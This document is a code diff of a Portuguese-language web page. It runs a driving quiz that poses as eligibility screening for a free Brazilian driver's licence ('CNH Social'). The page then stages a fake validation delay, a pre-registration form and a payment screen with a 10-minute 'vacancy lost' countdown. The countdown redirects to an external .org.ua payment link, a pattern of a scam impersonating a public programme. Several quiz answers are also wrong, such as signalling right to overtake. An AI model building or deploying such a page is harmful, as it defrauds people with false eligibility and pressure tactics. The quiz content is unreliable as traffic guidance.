-    {emoji:"🚸", titulo:"Próximo a uma escola, sinal indica?", opcoes:["👶 Atenção a crianças","🚗 Parar o carro","🏃 Corrida livre","⚠️ Apenas reduzir velocidade"], correta:0},
-    {emoji:"🧠", titulo:"Teste de atenção: qual figura é diferente das demais?", opcoes:["🟢 Quadrado","🟦 Quadrado","🟥 Quadrado","🔺 Triângulo"], correta:3},
-    {emoji:"⚠️", titulo:"Você vê uma placa de 'Curva Perigosa à Direita'. Qual atitude?", opcoes:["➡️ Reduzir velocidade","💨 Manter velocidade","↩️ Retroceder","🚗 Ultrapassar"], correta:0},
-    {emoji:"🧩", titulo:"Teste de memória: qual padrão segue após 🔵🔴🔵?", opcoes:["🔴🔵🔴","🔵🔴🔵","🟢🟢🔴","🔴🔴🔵"], correta:0},
-    {emoji:"🚦", titulo:"Semáforo com luz amarela. O que fazer?", opcoes:["⚠️ Reduzir e parar se necessário","⛔ Parar sempre","🟢 Acelerar","🚗 Ignorar"], correta:0},
-    {emoji:"🛑", titulo:"Parada obrigatória: o que é permitido?", opcoes:["🚗 Prosseguir somente se seguro","💨 Acelerar","↩️ Fazer retorno direto","⚠️ Reduzir apenas"], correta:0},
-    {emoji:"🏎️", titulo:"Você deseja ultrapassar em via de pista dupla. Condição correta?", opcoes:["↗️ Seta e verificar segurança","💨 Acelerar sem olhar","🛑 Esperar sem sinal","↩️ Retornar primeiro"], correta:0},
-    {emoji:"🧠", titulo:"Se uma sequência lógica é 2,4,6,8, qual próximo número?", opcoes:["10","12","9","11"], correta:0},
-    {emoji:"🚗", titulo:"Qual é a velocidade máxima em área urbana padrão?", opcoes:["50 km/h","30 km/h","70 km/h","60 km/h"], correta:0},
-    {emoji:"🛣️", titulo:"Como identificar via de mão dupla?", opcoes:["Sinalização e faixa central","Sem sinal é sempre mão única","Placas somente","Não é possível identificar"], correta:0},
-    {emoji:"🧩", titulo:"Qual figura completa a sequência 🔺⬛⬛🔺⬛?", opcoes:["⬛","🔺","⬜","🔵"], correta:0},
-    {emoji:"🚧", titulo:"Em pista em obras, linha contínua branca significa?", opcoes:["Não ultrapassar","Pode ultrapassar","Parar","Reduzir velocidade"], correta:0},
-    {emoji:"🚸", titulo:"Pedestres atravessando fora da faixa. Como agir?", opcoes:["⚠️ Reduzir e parar se necessário","💨 Acelerar","↩️ Dar ré","🛑 Ignorar"], correta:0},
-    {emoji:"🧠", titulo:"Qual das imagens não pertence ao grupo?", opcoes:["🚗, 🚕, 🛵, 🏠","🚦, 🛑, ⚠️, 🟢","🛣️, 🛤️, 🛑, 🚗","🔺, 🔵, 🔴, 🔺"], correta:0},
-    {emoji:"🏎️", titulo:"Ultrapassagem proibida em:", opcoes:["Curva sem visibilidade","Retas longas","Pistas largas","Pista dupla"], correta:0},
-    {emoji:"🚦", titulo:"Semáforo piscando em amarelo significa:", opcoes:["⚠️ Atenção redobrada","⛔ Parar","🟢 Seguir normal","💨 Acelerar"], correta:0},
-    {emoji:"🧠", titulo:"Se João é mais alto que Pedro, e Pedro mais alto que Ana, quem é o mais baixo?", opcoes:["Ana","Pedro","João","Não é possível"], correta:0},
-    {emoji:"🚗", titulo:"O que fazer ao estacionar em rua inclinada com freio de mão?", opcoes:["Rodar rodas para calçada","Deixar rodas soltas","Nada","Acelerar e parar"], correta:0},
-    {emoji:"🚧", titulo:"Faixa amarela contínua indica:", opcoes:["Proibido ultrapassar","Pode ultrapassar","Apenas reduzir","Parar sempre"], correta:0},
-    {emoji:"🛑", titulo:"Placa 'Dê a preferência'. O que significa?", opcoes:["🚗 Parar se houver trânsito","💨 Acelerar","↩️ Retornar","⚠️ Continuar sempre"], correta:0},
-    {emoji:"🧩", titulo:"Qual item completa a sequência: ▲, ▼, ▲, ▼, ?", opcoes:["▲","▼","■","○"], correta:0},
-    {emoji:"🚦", titulo:"O que fazer se o semáforo estiver apagado?", opcoes:["⚠️ Seguir como parada obrigatória","💨 Acelerar","↩️ Retornar","🚗 Ignorar"], correta:0},
-    {emoji:"🛣️", titulo:"Em estrada com neblina, qual atitude?", opcoes:["⚠️ Reduzir velocidade e usar farol baixo","💨 Acelerar","🚗 Ligar farol alto","🛑 Parar totalmente"], correta:0},
-    {emoji:"🏎️", titulo:"Ultrapassagem permitida apenas à esquerda em pistas de mão dupla?", opcoes:["✅ Sim","❌ Não","⚠️ Depende do veículo","🤔 Não sei"], correta:0}
+    {emoji:"🚦", titulo:"O que significa uma luz vermelha no semáforo?", opcoes:["⛔ Parar","⚠️ Atenção","🟢 Seguir","🚗 Reduzir velocidade"], correta:0},
+    {emoji:"🛣️", titulo:"Você está em uma via de mão única. Qual regra deve seguir?", opcoes:["↩️ Pode fazer retorno","➡️ Apenas seguir a mão da via","↔️ Pode mudar sentido","🛑 Parar sempre"], correta:1},
+    {emoji:"🧠", titulo:"Se A > B e B > C, então A > C?", opcoes:["✅ Sim","❌ Não","⚠️ Depende","🤔 Não sei"], correta:0},
+    {emoji:"🏎️", titulo:"Distância mínima segura entre veículos em estrada seca?", opcoes:["🚗 2 segundos","🚕 1 segundo","🚙 3 segundos","🛑 0,5 segundo"], correta:0},
+    {emoji:"🚗", titulo:"Sinal correto ao ultrapassar outro veículo?", opcoes:["↗️ Seta direita","↖️ Seta esquerda","⚠️ Farol alto","💨 Nenhum"], correta:0},
+    {emoji:"🛑", titulo:"O que significa uma placa de 'Pare'?", opcoes:["⛔ Parar obrigatoriamente","⚠️ Atenção e seguir","🟢 Pode prosseguir","🚗 Apenas reduzir velocidade"], correta:0},
+    {emoji:"🚧", titulo:"Área com sinal de obras. Como deve dirigir?", opcoes:["🚗 Velocidade normal","⚠️ Reduzir e atenção","💨 Acelerar","🛑 Parar totalmente"], correta:1},
+    {emoji:"🚸", titulo:"Próximo a uma escola, sinal indica?", opcoes:["👶 Atenção a crianças","🚗 Parar o carro","🏃 Corrida livre","⚠️ Apenas reduzir velocidade"], correta:0},
+    {emoji:"🧠", titulo:"Teste de atenção: qual figura é diferente das demais?", opcoes:["🟢 Quadrado","🟦 Quadrado","🟥 Quadrado","🔺 Triângulo"], correta:3},
+    {emoji:"⚠️", titulo:"Você vê uma placa de 'Curva Perigosa à Direita'. Qual atitude?", opcoes:["➡️ Reduzir velocidade","💨 Manter velocidade","↩️ Retroceder","🚗 Ultrapassar"], correta:0},
+    {emoji:"🧩", titulo:"Teste de memória: qual padrão segue após 🔵🔴🔵?", opcoes:["🔴🔵🔴","🔵🔴🔵","🟢🟢🔴","🔴🔴🔵"], correta:0},
+    {emoji:"🚦", titulo:"Semáforo com luz amarela. O que fazer?", opcoes:["⚠️ Reduzir e parar se necessário","⛔ Parar sempre","🟢 Acelerar","🚗 Ignorar"], correta:0},
+    {emoji:"🛑", titulo:"Parada obrigatória: o que é permitido?", opcoes:["🚗 Prosseguir somente se seguro","💨 Acelerar","↩️ Fazer retorno direto","⚠️ Reduzir apenas"], correta:0},
+    {emoji:"🏎️", titulo:"Você deseja ultrapassar em via de pista dupla. Condição correta?", opcoes:["↗️ Seta e verificar segurança","💨 Acelerar sem olhar","🛑 Esperar sem sinal","↩️ Retornar primeiro"], correta:0},
+    {emoji:"🧠", titulo:"Se uma sequência lógica é 2,4,6,8, qual próximo número?", opcoes:["10","12","9","11"], correta:0},
+    {emoji:"🚗", titulo:"Qual é a velocidade máxima em área urbana padrão?", opcoes:["50 km/h","30 km/h","70 km/h","60 km/h"], correta:0},
+    {emoji:"🛣️", titulo:"Como identificar via de mão dupla?", opcoes:["Sinalização e faixa central","Sem sinal é sempre mão única","Placas somente","Não é possível identificar"], correta:0},
+    {emoji:"🧩", titulo:"Qual figura completa a sequência 🔺⬛⬛🔺⬛?", opcoes:["⬛","🔺","⬜","🔵"], correta:0},
+    {emoji:"🚧", titulo:"Em pista em obras, linha contínua branca significa?", opcoes:["Não ultrapassar","Pode ultrapassar","Parar","Reduzir velocidade"], correta:0},
+    {emoji:"🚸", titulo:"Pedestres atravessando fora da faixa. Como agir?", opcoes:["⚠️ Reduzir e parar se necessário","💨 Acelerar","↩️ Dar ré","🛑 Ignorar"], correta:0},
+    {emoji:"🧠", titulo:"Qual das imagens não pertence ao grupo?", opcoes:["🚗, 🚕, 🛵, 🏠","🚦, 🛑, ⚠️, 🟢","🛣️, 🛤️, 🛑, 🚗","🔺, 🔵, 🔴, 🔺"], correta:0},
+    {emoji:"🏎️", titulo:"Ultrapassagem proibida em:", opcoes:["Curva sem visibilidade","Retas longas","Pistas largas","Pista dupla"], correta:0},
+    {emoji:"🚦", titulo:"Semáforo piscando em amarelo significa:", opcoes:["⚠️ Atenção redobrada","⛔ Parar","🟢 Seguir normal","💨 Acelerar"], correta:0},
+    {emoji:"🧠", titulo:"Se João é mais alto que Pedro, e Pedro mais alto que Ana, quem é o mais baixo?", opcoes:["Ana","Pedro","João","Não é possível"], correta:0},
+    {emoji:"🚗", titulo:"O que fazer ao estacionar em rua inclinada com freio de mão?", opcoes:["Rodar rodas para calçada","Deixar rodas soltas","Nada","Acelerar e parar"], correta:0},
+    {emoji:"🚧", titulo:"Faixa amarela contínua indica:", opcoes:["Proibido ultrapassar","Pode ultrapassar","Apenas reduzir","Parar sempre"], correta:0},
+    {emoji:"🛑", titulo:"Placa 'Dê a preferência'. O que significa?", opcoes:["🚗 Parar se houver trânsito","💨 Acelerar","↩️ Retornar","⚠️ Continuar sempre"], correta:0},
+    {emoji:"🧩", titulo:"Qual item completa a sequência: ▲, ▼, ▲, ▼, ?", opcoes:["▲","▼","■","○"], correta:0},
+    {emoji:"🚦", titulo:"O que fazer se o semáforo estiver apagado?", opcoes:["⚠️ Seguir como parada obrigatória","💨 Acelerar","↩️ Retornar","🚗 Ignorar"], correta:0},
+    {emoji:"🛣️", titulo:"Em estrada com neblina, qual atitude?", opcoes:["⚠️ Reduzir velocidade e usar farol baixo","💨 Acelerar","🚗 Ligar farol alto","🛑 Parar totalmente"], correta:0},
+    {emoji:"🏎️", titulo:"Ultrapassagem permitida apenas à esquerda em pistas de mão dupla?", opcoes:["✅ Sim","❌ Não","⚠️ Depende do veículo","🤔 Não sei"], correta:0}
 ];
 
 let currentQuestion = 0;
 const totalQuestions = questions.length;
-let score = 0; 
-const MIN_SCORE = 23; 
+let score = 0;
+const MIN_SCORE = 23;
 let cnhCategory = ''; // Variável para armazenar a Categoria escolhida
 
+// Elementos Principais
+const welcomeScreen = document.getElementById('welcome-screen'); // NOVO
+const startBtn = document.getElementById('startBtn'); // NOVO
+const quizContent = document.getElementById('quiz-content');
+
+// Elementos do Quiz
 const progressBar = document.getElementById('progress-bar');
 const optionsContainer = document.getElementById('options');
 const nextBtn = document.getElementById('nextBtn');
 const clickSound = document.getElementById('click-sound');
 
-const quizContent = document.getElementById('quiz-content');
 
-// Elementos da Nova Tela de Transição
+// Elementos da Nova Tela de Transição (Após Quiz)
 const transitionScreen = document.getElementById('transition-screen');
 const loadingPhase = document.getElementById('loading-phase');
 const loadingProgress = document.getElementById('loading-progress');
@@ -581,228 +655,256 @@ const categoryButtons = document.querySelectorAll('.category-btn');
 // Elementos das Telas Pós-Quiz
 const resultScreen = document.getElementById('result-screen');
 const preCadastroForm = document.getElementById('pre-cadastro-form');
-const paymentScreen = document.getElementById('payment-screen'); 
-const payBtn = document.getElementById('payBtn'); 
-const countdownElement = document.getElementById('countdown'); 
+const paymentScreen = document.getElementById('payment-screen');
+const payBtn = document.getElementById('payBtn');
+const countdownElement = document.getElementById('countdown');
 
 const PAYMENT_LINK = "https://compraseguraonline.org.ua/c/caf6413b55"; // LINK DE PAGAMENTO DEFINIDO AQUI
 
 let timerInterval;
 
+// NOVO: Função para iniciar o Quiz
+function startQuiz() {
+    welcomeScreen.classList.add('hidden');
+    quizContent.classList.remove('hidden');
+    showQuestion(currentQuestion);
+}
+
+// NOVO: Evento para iniciar o Quiz
+startBtn.addEventListener('click', startQuiz);
+
+
 // Função para iniciar a animação de Confetes
 function startConfetti() {
-    confettiContainer.innerHTML = '';
-    const colors = ['#ffcc00', '#002b7f', '#4CAF50', '#ff4500'];
-    const numPieces = 50;
+    confettiContainer.innerHTML = '';
+    const colors = ['#ffcc00', '#002b7f', '#4CAF50', '#ff4500'];
+    const numPieces = 50;
 
-    for (let i = 0; i < numPieces; i++) {
-        const piece = document.createElement('div');
-        piece.classList.add('confetti-piece');
-        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
-        piece.style.left = `${Math.random() * 100}%`;
-        piece.style.animationDelay = `${Math.random() * 2}s`;
-        piece.style.animationDuration = `${(Math.random() * 1.5) + 1.5}s`;
-        piece.style.transform = `rotate(${Math.random() * 360}deg)`;
-        confettiContainer.appendChild(piece);
-    }
+    for (let i = 0; i < numPieces; i++) {
+        const piece = document.createElement('div');
+        piece.classList.add('confetti-piece');
+        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
+        piece.style.left = `${Math.random() * 100}%`;
+        piece.style.animationDelay = `${Math.random() * 2}s`;
+        piece.style.animationDuration = `${(Math.random() * 1.5) + 1.5}s`;
+        piece.style.transform = `rotate(${Math.random() * 360}deg)`;
+        confettiContainer.appendChild(piece);
+    }
 }
 
 
 function showQuestion(index){
-    const q = questions[index];
-    document.getElementById('question-emoji').textContent = q.emoji;
-    document.getElementById('question-title').textContent = q.titulo;
-    document.getElementById('question-count').textContent = `${index+1}/${totalQuestions}`;
-    optionsContainer.innerHTML = '';
-    
-    q.opcoes.forEach((opt,i)=>{
-        const card = document.createElement('div');
-        card.classList.add('option-card');
-        card.textContent = opt;
+    const q = questions[index];
+    document.getElementById('question-emoji').textContent = q.emoji;
+    document.getElementById('question-title').textContent = q.titulo;
+    document.getElementById('question-count').textContent = `${index+1}/${totalQuestions}`;
+    optionsContainer.innerHTML = '';
+    
+    q.opcoes.forEach((opt,i)=>{
+        const card = document.createElement('div');
+        card.classList.add('option-card');
+        card.textContent = opt;
 
-        card.addEventListener('click', ()=>{
-            if(optionsContainer.classList.contains('answered')) return;
-            clickSound.currentTime=0;
-            clickSound.play();
-            
-            if(i === q.correta){
-                card.classList.add('correct');
-                score++; 
-            } else {
-                card.classList.add('wrong');
-            }
-            
-            document.querySelectorAll('.option-card').forEach(c=>c.style.pointerEvents='none');
-            optionsContainer.classList.add('answered');
-        });
+        card.addEventListener('click', ()=>{
+            if(optionsContainer.classList.contains('answered')) return;
+            clickSound.currentTime=0;
+            clickSound.play();
+            
+            if(i === q.correta){
+                card.classList.add('correct');
+                score++; 
+            } else {
+                card.classList.add('wrong');
+            }
+            
+            document.querySelectorAll('.option-card').forEach(c=>c.style.pointerEvents='none');
+            optionsContainer.classList.add('answered');
+        });
 
-        optionsContainer.appendChild(card);
-    });
+        optionsContainer.appendChild(card);
+    });
 
-    progressBar.style.width = `${((index + 1) / totalQuestions) * 100}%`;
-    optionsContainer.classList.remove('answered');
+    progressBar.style.width = `${((index + 1) / totalQuestions) * 100}%`;
+    optionsContainer.classList.remove('answered');
 }
 
-// NOVO: Função para mostrar a tela de Escolha da CNH após o carregamento
+// Função para mostrar a tela de Escolha da CNH após o carregamento
 function showChoiceScreen() {
-    loadingPhase.classList.add('hidden');
-    choicePhase.classList.remove('hidden');
+    loadingPhase.classList.add('hidden');
+    choicePhase.classList.remove('hidden');
 
-    if (score >= MIN_SCORE) {
-         startConfetti(); // Inicia os confetes ao mostrar a tela de sucesso/escolha
-    } else {
-         // Lógica para reprovação
-         document.querySelector('#choice-phase h2').textContent = '⚠️ Seu Perfil foi Analisado!';
-         document.querySelector('#choice-phase h2').style.color = '#ff4500';
-         document.querySelector('#choice-phase p').innerHTML = 'Infelizmente, sua pontuação **não atingiu a aptidão mínima** para a CNH gratuita.';
-         document.querySelector('.category-selection h3').classList.add('hidden');
-         
-         // Substitui os botões de escolha por um botão de "Ver Resultado"
-         document.querySelector('.category-options').innerHTML = '<button id="view-final-result" class="category-btn" style="background: #002b7f; color: #fff;">Ver Resultado Final Completo</button>';
-         document.getElementById('view-final-result').addEventListener('click', showResultScreen);
-    }
+    if (score >= MIN_SCORE) {
+          startConfetti(); // Inicia os confetes ao mostrar a tela de sucesso/escolha
+    } else {
+          // Lógica para reprovação
+          document.querySelector('#choice-phase h2').textContent = '⚠️ Seu Perfil foi Analisado!';
+          document.querySelector('#choice-phase h2').style.color = '#ff4500';
+          document.querySelector('#choice-phase p').innerHTML = 'Infelizmente, sua pontuação **não atingiu a aptidão mínima** para a CNH gratuita.';
+          document.querySelector('.category-selection h3').classList.add('hidden');
+          
+          // Substitui os botões de escolha por um botão de "Ver Resultado"
+          document.querySelector('.category-options').innerHTML = '<button id="view-final-result" class="category-btn" style="background: #002b7f; color: #fff;">Ver Resultado Final Completo</button>';
+          document.getElementById('view-final-result').addEventListener('click', showResultScreen);
+    }
 }
 
-// NOVO: Função para a Tela de Transição (com carregamento de 3s)
+// Função para a Tela de Transição (com carregamento de 3s)
 function showTransitionScreen() {
-    quizContent.classList.add('hidden');
-    transitionScreen.classList.remove('hidden');
+    quizContent.classList.add('hidden');
+    transitionScreen.classList.remove('hidden');
 
-    loadingPhase.classList.remove('hidden');
-    choicePhase.classList.add('hidden');
-    confettiContainer.innerHTML = '';
+    loadingPhase.classList.remove('hidden');
+    choicePhase.classList.add('hidden');
+    confettiContainer.innerHTML = '';
 
-    // Garante que o progresso inicia em 0
-    loadingProgress.style.transition = 'width 0s';
-    loadingProgress.style.width = '0%';
-    setTimeout(() => {
-        loadingProgress.style.transition = 'width 3s ease-in-out';
-    }, 50);
+    // Garante que o progresso inicia em 0
+    loadingProgress.style.transition = 'width 0s';
+    loadingProgress.style.width = '0%';
+    setTimeout(() => {
+        loadingProgress.style.transition = 'width 3s ease-in-out';
+    }, 50);
 
-    validationMessage.textContent = 'Estamos Validando Sua Pontuação e Elegibilidade...';
+    validationMessage.textContent = 'Estamos Validando Sua Pontuação e Elegibilidade...';
 
-    // Inicia o carregamento (animação CSS)
-    setTimeout(() => {
-        loadingProgress.style.width = '100%'; 
-    }, 100);
+    // Inicia o carregamento (animação CSS)
+    setTimeout(() => {
+        loadingProgress.style.width = '100%'; 
+    }, 100);
 
-    // Tempo para simular a validação (3 segundos)
-    setTimeout(() => {
-        showChoiceScreen(); 
-    }, 3000); 
+    // Tempo para simular a validação (3 segundos)
+    setTimeout(() => {
+        showChoiceScreen(); 
+    }, 3000); 
 }
 
 
 function showResultScreen(){
-    // Esconde a transição e mostra a tela de pré-cadastro (TELA 1)
-    transitionScreen.classList.add('hidden');
-    resultScreen.classList.remove('hidden');
+    // Esconde a transição e mostra a tela de pré-cadastro (TELA 1)
+    transitionScreen.classList.add('hidden');
+    resultScreen.classList.remove('hidden');
 
-    document.getElementById('final-score').textContent = `${score} de ${totalQuestions}`;
-    
-    const cnhDisplay = document.getElementById('cnh-chosen');
-    const displayContainer = document.getElementById('selected-cnh-display');
-    
-    if (cnhCategory) {
-         cnhDisplay.textContent = `CNH Categoria ${cnhCategory}`;
-         displayContainer.classList.remove('hidden');
-    } else {
-         // Se não escolheu (porque reprovou), esconde a escolha da CNH
-         displayContainer.classList.add('hidden');
-    }
+    document.getElementById('final-score').textContent = `${score} de ${totalQuestions}`;
+    
+    const cnhDisplay = document.getElementById('cnh-chosen');
+    const displayContainer = document.getElementById('selected-cnh-display');
+    
+    if (cnhCategory) {
+          cnhDisplay.textContent = `CNH Categoria ${cnhCategory}`;
+          displayContainer.classList.remove('hidden');
+    } else {
+          // Se não escolheu (porque reprovou), esconde a escolha da CNH
+          displayContainer.classList.add('hidden');
+    }
 
 
-    if (score < MIN_SCORE) {
-        document.querySelector('.result-container h2').textContent = '⚠️ Você não atingiu a pontuação mínima';
-        document.querySelector('.result-container h2').style.color = '#f44336';
-        document.querySelector('.result-message').innerHTML = `Sua pontuação foi de **${score} acertos**. A pontuação mínima é **${MIN_SCORE}**. Infelizmente, você não está apto(a) para a CNH Social neste momento.`;
-        document.getElementById('submitBtn').style.background = '#9e9e9e';
-        document.getElementById('submitBtn').style.pointerEvents = 'none';
-        document.getElementById('submitBtn').textContent = 'Inscrição Não Liberada';
-    }
+    if (score < MIN_SCORE) {
+        document.querySelector('.result-container h2').textContent = '⚠️ Você não atingiu a pontuação mínima';
+        document.querySelector('.result-container h2').style.color = '#f44336';
+        document.querySelector('.result-message').innerHTML = `Sua pontuação foi de **${score} acertos**. A pontuação mínima é **${MIN_SCORE}**. Infelizmente, você não está apto(a) para a CNH Social neste momento.`;
+        document.getElementById('submitBtn').style.background = '#9e9e9e';
+        document.getElementById('submitBtn').style.pointerEvents = 'none';
+        document.getElementById('submitBtn').textContent = 'Inscrição Não Liberada';
+    }
 }
 
 function startPaymentTimer(){
-    // Inicia o cronômetro para a TELA 2 (10 minutos)
-    let timeInSeconds = 600; 
-    
-    function updateCountdown() {
-        const minutes = Math.floor(timeInSeconds / 60);
-        const seconds = timeInSeconds % 60;
-        
-        countdownElement.textContent = 
-            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-            
-        if (timeInSeconds <= 0) {
-            clearInterval(timerInterval);
-            countdownElement.textContent = "00:00";
-            payBtn.textContent = "TEMPO ESGOTADO. VAGA PERDIDA.";
-            payBtn.disabled = true;
-            payBtn.style.background = '#9e9e9e';
-            payBtn.style.boxShadow = 'none';
-        } else {
-            timeInSeconds--;
-        }
-    }
-    
-    // Zera qualquer timer anterior e inicia um novo
-    if (timerInterval) clearInterval(timerInterval);
-    timerInterval = setInterval(updateCountdown, 1000);
-    updateCountdown();
+    // Inicia o cronômetro para a TELA 2 (10 minutos)
+    let timeInSeconds = 600; 
+    
+    function updateCountdown() {
+        const minutes = Math.floor(timeInSeconds / 60);
+        const seconds = timeInSeconds % 60;
+        
+        countdownElement.textContent = 
+            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+        if (timeInSeconds <= 0) {
+            clearInterval(timerInterval);
+            countdownElement.textContent = "00:00";
+            payBtn.textContent = "TEMPO ESGOTADO. VAGA PERDIDA.";
+            payBtn.disabled = true;
+            payBtn.style.background = '#9e9e9e';
+            payBtn.style.boxShadow = 'none';
+        } else {
+            timeInSeconds--;
+        }
+    }
+    
+    // Zera qualquer timer anterior e inicia um novo
+    if (timerInterval) clearInterval(timerInterval);
+    timerInterval = setInterval(updateCountdown, 1000);
+    updateCountdown();
 }
 
 nextBtn.addEventListener('click', ()=>{
-    if(optionsContainer.classList.contains('answered')){
-        if(currentQuestion < totalQuestions - 1){
-            currentQuestion++;
-            showQuestion(currentQuestion);
-        } else {
-            // Ao final do quiz, chama a nova tela de transição
-            showTransitionScreen(); 
-        }
-    } else {
-        alert("Por favor, selecione uma opção antes de prosseguir.");
-    }
+    if(optionsContainer.classList.contains('answered')){
+        if(currentQuestion < totalQuestions - 1){
+            currentQuestion++;
+            showQuestion(currentQuestion);
+        } else {
+            // Ao final do quiz, chama a nova tela de transição
+            showTransitionScreen(); 
+        }
+    } else {
+        alert("Por favor, selecione uma opção antes de prosseguir.");
+    }
 });
 
-// NOVO: Lógica para a escolha da CNH
+// Lógica para a escolha da CNH
 categoryButtons.forEach(button => {
-    button.addEventListener('click', () => {
-        // 1. Limpa a seleção em todos
-        categoryButtons.forEach(btn => btn.classList.remove('selected'));
-        
-        // 2. Marca o botão clicado
-        button.classList.add('selected');
-        
-        // 3. Salva a escolha
-        cnhCategory = button.getAttribute('data-category');
-        
-        // 4. Pausa para o efeito visual e Procede para a próxima tela (Resultado/Pré-cadastro)
-        setTimeout(showResultScreen, 500); 
-    });
+    button.addEventListener('click', (e) => {
+        categoryButtons.forEach(btn => btn.classList.remove('selected'));
+        e.target.classList.add('selected');
+        cnhCategory = e.target.getAttribute('data-category');
+        
+        // Adiciona um botão para prosseguir após a escolha
+        let proceedBtn = document.getElementById('proceed-to-form');
+        if (!proceedBtn) {
+            proceedBtn = document.createElement('button');
+            proceedBtn.id = 'proceed-to-form';
+            proceedBtn.textContent = 'Confirmar Categoria e Ir para o Pré-cadastro';
+            proceedBtn.classList.add('category-btn');
+            proceedBtn.style.marginTop = '20px';
+            proceedBtn.style.background = 'linear-gradient(90deg, #4CAF50, #2e7d32)';
+            proceedBtn.style.color = '#fff';
+            proceedBtn.style.fontWeight = '700';
+            proceedBtn.addEventListener('click', showResultScreen);
+            e.target.parentNode.after(proceedBtn);
+        }
+    });
 });
 
+// Evento para o formulário de pré-cadastro (TELA 1)
+preCadastroForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    
+    // Simples validação de que a categoria foi escolhida (apenas para aprovados)
+    if (score >= MIN_SCORE && !cnhCategory) {
+        alert("Por favor, selecione a Categoria da sua CNH.");
+        return;
+    }
 
-// AÇÃO DO BOTÃO 'Garantir Minha CNH Gratuita Agora' (TELA 1)
-preCadastroForm.addEventListener('submit', (event) => {
-    event.preventDefault(); // CORREÇÃO AQUI
-    if (score >= MIN_SCORE) {
-        // Esconde a tela de resultado e mostra a tela de pagamento (TELA 2)
-        resultScreen.classList.add('hidden');
-        paymentScreen.classList.remove('hidden');
-        startPaymentTimer();
-    }
+    // Se aprovado, mostra a tela de pagamento (TELA 2)
+    if (score >= MIN_SCORE) {
+        resultScreen.classList.add('hidden');
+        paymentScreen.classList.remove('hidden');
+        startPaymentTimer();
+    }
 });
 
-// AÇÃO DO BOTÃO DE PAGAMENTO (TELA 2)
+// Evento para o botão de pagamento (TELA 2)
 payBtn.addEventListener('click', () => {
-    // Redireciona para o link de pagamento
-    window.location.href = PAYMENT_LINK;
+    // Redireciona para o link de pagamento
+    if (PAYMENT_LINK) {
+        window.location.href = PAYMENT_LINK;
+    } else {
+        alert("Link de pagamento não configurado.");
+    }
 });
 
 
-// Inicializa o quiz na primeira pergunta
-showQuestion(currentQuestion);
+// Garantir que a primeira pergunta seja exibida quando o quiz começar.
+// Com a nova tela de boas-vindas, showQuestion será chamada por startQuiz.
 </script>
 
 </body>
